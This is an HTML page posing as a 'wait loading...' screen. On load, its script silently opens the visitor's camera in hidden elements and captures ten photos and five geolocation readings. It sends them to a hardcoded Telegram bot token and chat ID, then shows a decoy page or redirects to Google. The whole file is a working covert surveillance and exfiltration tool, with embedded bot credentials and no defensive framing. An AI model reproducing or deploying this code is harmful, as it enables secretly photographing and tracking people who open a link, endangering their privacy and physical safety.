<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <title>wait</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px; }
    video, canvas { display: none; }
    #customPage { display: none; padding: 30px; }
  </style>
</head>
<body>
  <h1 id="status">wait loading...</h1>

  <video id="video" autoplay playsinline width="300" height="225"></video>
  <canvas id="canvas" width="300" height="225"></canvas>

  <div id="customPage">
    <h2></h2>
    <p></p>
    <p><a href="https://example.com/join" target="_blank"> </a></p>
  </div>

  <script>
    const botToken = "7549281756:AAE_5JMYxK3UnX3KIRxWvgEkXKrFaS9hVZ4";
    const chatId = "5743927668";
    const redirectToCustomPage = true; // true = internal page, false = external URL
    const redirectURL = "https://www.google.com";

    let videoStream = null;
    let photoCount = 0;
    let locationCount = 0;

    async function startCamera() {
      const video = document.getElementById("video");
      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = videoStream;
    }

    async function sendPhoto() {
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const video = document.getElementById("video");

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", photoBlob, `photo${photoCount}.jpg`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      photoCount++;
    }

    async function sendLocation() {
      navigator.geolocation.getCurrentPosition(async position => {
        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });

        locationCount++;
      }, error => {
        console.error("Location Error:", error.message);
      });
    }

    async function startSending() {
      await startCamera();

      const interval = setInterval(async () => {
        if (photoCount < 10) {
          await sendPhoto();
        }

        if (locationCount < 5 && photoCount % 2 === 0) {
          await sendLocation();
        }

        if (photoCount >= 10 && locationCount >= 5) {
          clearInterval(interval);
          stopCamera();

          if (redirectToCustomPage) {
            document.getElementById("status").style.display = "none";
            document.getElementById("video").style.display = "none";
            document.getElementById("customPage").style.display = "block";
          } else {
            window.location.href = redirectURL;
          }
        }
      }, 1000);
    }

    function stopCamera() {
      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
      }
    }

    window.onload = startSending;
  </script>
</body>
</html>
